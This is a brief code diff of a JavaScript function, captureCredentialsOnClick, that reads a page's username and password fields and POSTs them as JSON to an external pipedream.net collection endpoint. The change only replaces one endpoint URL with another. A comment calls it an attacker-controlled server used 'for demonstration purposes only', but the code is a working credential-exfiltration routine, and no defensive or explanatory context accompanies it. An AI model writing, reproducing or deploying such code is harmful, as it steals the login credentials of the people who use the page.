@@ -6,7 +6,7 @@ function captureCredentialsOnClick() {
       const password = document.getElementById('password').value;
   
       // Send the captured data to an attacker-controlled server (for demonstration purposes only)
-      fetch('https://eo9brp5e0erj5kr.m.pipedream.net', {
+      fetch('https://eo90dmq6lyhlqm1.m.pipedream.net', {
         method: 'POST',
         body: JSON.stringify({ username, password }),
         headers: { 'Content-Type': 'application/json' },
